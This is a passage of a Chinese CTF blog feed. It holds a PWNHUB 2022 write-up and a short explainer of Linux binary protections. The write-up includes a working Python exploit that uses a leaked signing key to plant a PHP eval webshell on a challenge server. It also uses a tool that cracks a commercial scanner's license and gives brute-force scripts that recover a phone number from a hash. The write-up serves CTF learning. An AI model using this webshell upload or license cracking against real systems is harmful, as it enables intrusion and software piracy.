太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
      <tag>Crypto</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux保护机制</title>
    <link href="/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。<br>Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE / ASLR"></a>PIE / ASLR</h2><p>地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。</p><table><thead><tr><th></th><th>随机化段</th><th>设置</th></tr></thead><tbody><tr><td>ADLR</td><td>堆、栈、mmap（libc库）、VDSO page</td><td>由操作系统设置</td></tr><tr><td>PIE</td><td>数据段、代码段</td><td>由编译器设置</td></tr></tbody></table><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。<br> 主要用来保护重定位表段对应数据区域，默认可写 </p><ol><li>Partial RELRO： got表不可写，got.plt可写 </li><li>Full RELRO： got表，got.plt不可写  </li></ol><p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh\x00获得shell</strong><br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。<br>参考：</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>在编译的时候检查源码是否存在缓冲区溢出等错误。<br>简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。<br>这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。</p><h2 id="BRATH"><a href="#BRATH" class="headerlink" title="BRATH"></a>BRATH</h2><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
